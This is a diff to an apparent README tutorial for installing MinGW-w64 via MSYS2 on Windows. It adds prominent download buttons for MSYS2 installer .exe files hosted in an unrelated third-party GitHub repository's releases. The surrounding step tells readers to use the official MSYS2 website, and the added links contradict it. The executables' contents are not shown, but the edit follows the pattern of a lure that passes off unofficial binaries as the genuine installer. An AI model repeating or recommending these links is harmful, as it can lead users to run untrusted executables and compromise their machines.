@@ -3,6 +3,15 @@ FFF
 # Step 1: Install MinGW-w64 via MSYS2
 The most modern and stable method for installing MinGW on Windows is to use the MSYS2 package manager.
 1. Go to the official MSYS2 website and download the installer (.exe file).
+
+<a href="https://github.com/citron-software/Compile-C-with-MINGW/releases/download/MSYS2-1/msys2-x86_64-20260927.exe">
+  <kbd>➔ Click here for download x86_64</kbd>
+</a>
+
+<a href="https://github.com/citron-software/Compile-C-with-MINGW/releases/download/MSYS2-2/msys2-arm64-20260927.exe">
+  <kbd>➔ Click here for download arm64</kbd>
+</a>
+
 2. Run the installer and follow the instructions, keeping the default installation folder (C:\msys64).
 3. At the end of the installation, check the box to open the MSYS2 UCRT64 terminal (or search for “MSYS2 UCRT64” in your Start menu).
 4. In the terminal that opens, type the following command to install the GCC compiler and the essential development tools:
